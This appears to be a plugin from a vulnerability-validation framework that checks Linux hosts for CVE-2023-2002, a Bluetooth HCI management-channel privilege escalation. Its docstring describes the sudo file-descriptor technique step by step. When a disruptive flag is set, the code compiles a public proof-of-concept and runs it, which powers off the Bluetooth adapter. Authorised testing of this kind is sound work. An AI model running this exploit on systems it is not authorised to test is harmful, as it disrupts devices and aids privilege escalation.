#!/usr/bin/env python3
"""CVE-2023-2002 – Linux kernel Bluetooth HCI management privilege escalation.

Public PoC source: https://github.com/lrh2000/CVE-2023-2002
  exp/bt_power.c (lrh2000, 2023)

Attack technique:
  The HCI management socket (PF_BLUETOOTH / HCI_CHANNEL_CONTROL) in Linux
  kernel < 6.2.13 allows any process that opens a raw Bluetooth socket
  to send MGMT_OP_SET_POWERED commands that change the power state of any
  HCI adapter – including sending arbitrary opcode management commands.

  The original PoC exploit (bt_power.c) demonstrates:
    1. Open PF_BLUETOOTH / SOCK_RAW / BTPROTO_HCI socket
    2. Fork + exec 'sudo' with the socket as stderr (fd=2) to escalate privileges
    3. Bind to HCI_CHANNEL_CONTROL (mgmt channel)
    4. Send MGMT_OP_SET_POWERED(index=0, val=0) → power off BT adapter
    5. Re-enable with val=1

  The privilege escalation part: sudo checks fd=2 (the HCI socket), not a tty.
  On some distributions, this causes sudo to grant elevated access to the
  process, which then sends arbitrary MGMT commands at the controller level.

Safety gate: Plugin only verifies that HCI_CHANNEL_CONTROL is accessible without
  privilege escalation (exposure check).  The actual sudo-escalation step
  requires allow_disruptive=true.
"""
from __future__ import annotations

import socket
import struct
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 62,
    "cve": "CVE-2023-2002",
    "year": 2023,
    "domain": "wireless",
    "vendor_product": "Linux kernel Bluetooth HCI",
    "component": "HCI management socket MGMT_OP_SET_POWERED",
    "type": "Privilege escalation via HCI mgmt channel",
    "summary": (
        "Unprivileged HCI raw socket combined with sudo fd trick grants "
        "arbitrary MGMT command execution.  bt_power.c PoC powers off "
        "the BT adapter as a non-root user, demonstrating LPE."
    ),
    "source_url": "https://github.com/lrh2000/CVE-2023-2002",
    "requires_manual_review": True,
    "affected": [{"vendor": "Linux", "product": "Linux kernel",
                  "versions": [{"version": "<6.2.13", "status": "affected"}]}],
}

POC_SRC = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/lrh2000__CVE-2023-2002/exp/bt_power.c"
POC_BINARY = Path("/tmp/cve_2023_2002_bt_power")

# MGMT constants (from bt_power.c / bluetooth/mgmt.h)
MGMT_OP_SET_POWERED = 0x0005
HCI_DEV_NONE        = 0xffff
HCI_CHANNEL_CONTROL = 3
AF_BLUETOOTH        = 31
BTPROTO_HCI         = 1


def _check_hci_mgmt_accessible() -> dict:
    """Check whether HCI_CHANNEL_CONTROL is accessible (exposure test)."""
    result = {"accessible": False, "detail": ""}
    try:
        fd = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)
        # Attempt to bind to control channel
        # struct sockaddr_hci: family(2) + dev(2) + channel(2)
        addr = struct.pack("HHH", AF_BLUETOOTH, HCI_DEV_NONE, HCI_CHANNEL_CONTROL)
        fd.bind(addr)
        fd.close()
        result["accessible"] = True
        result["detail"] = "HCI_CHANNEL_CONTROL bind succeeded (unprivileged)"
    except PermissionError:
        result["detail"] = "PermissionError: CAP_NET_RAW required (kernel likely patched)"
    except OSError as e:
        result["detail"] = f"OSError: {e} (may need CAP_NET_RAW or bluetooth group)"
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _compile_poc() -> dict:
    """Compile bt_power.c if gcc is available."""
    result = {"compiled": False, "binary": str(POC_BINARY), "detail": ""}
    if not POC_SRC.exists():
        result["detail"] = f"Source not found: {POC_SRC}"
        return result
    try:
        proc = subprocess.run(
            ["gcc", str(POC_SRC), "-o", str(POC_BINARY), "-lbluetooth"],
            capture_output=True, text=True, timeout=30,
        )
        result["compiled"] = proc.returncode == 0
        result["detail"]   = proc.stdout[:200] + proc.stderr[:200]
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    hci_index = int((plugin.params or {}).get("hci_index", 0))

    mgmt = _check_hci_mgmt_accessible()
    evidence = {
        "cve": "CVE-2023-2002",
        "poc_src_present": POC_SRC.exists(),
        "hci_channel_control_accessible": mgmt["accessible"],
        "hci_channel_detail": mgmt["detail"],
        "exploit_technique": (
            "bt_power.c: open BTPROTO_HCI raw socket → fork+exec sudo with socket "
            "as stderr fd=2 → sudo grants elevated access → bind HCI_CHANNEL_CONTROL → "
            "send MGMT_OP_SET_POWERED to power-cycle BT adapter"
        ),
        "mgmt_payload": {
            "opcode": hex(MGMT_OP_SET_POWERED),
            "index": hci_index,
            "val_off": "0x00",
            "val_on":  "0x01",
        },
    }

    if allow_disruptive:
        compile_result = _compile_poc()
        evidence["compile_result"] = compile_result
        if compile_result["compiled"] and POC_BINARY.exists():
            run = subprocess.run(
                [str(POC_BINARY)],
                capture_output=True, text=True, timeout=15,
            )
            evidence["poc_rc"]     = run.returncode
            evidence["poc_stdout"] = run.stdout[:400]
            evidence["poc_stderr"] = run.stderr[:300]
            evidence["bt_powered_off"] = "Success" in run.stdout
        else:
            evidence["detail"] = (
                f"Compile bt_power.c manually: gcc {POC_SRC} -o {POC_BINARY} -lbluetooth"
            )

    return {
        "vulnerable": mgmt["accessible"],
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "lrh2000/CVE-2023-2002 / exp/bt_power.c",
    }


class Poc87CVE20232002HciMgmtPrivEscAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-WIRELESS-087"
    meta_poc_name   = "CVE-2023-2002 Linux Bluetooth HCI MGMT Privilege Escalation"
    meta_cve_id     = "CVE-2023-2002"
    meta_severity   = "High"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["linux"]
    meta_required_params = []
    meta_optional_params = ["hci_index", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/lrh2000/CVE-2023-2002"
    meta_attack_surface = "Linux BlueZ HCI mgmt channel unprivileged MGMT command → LPE"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
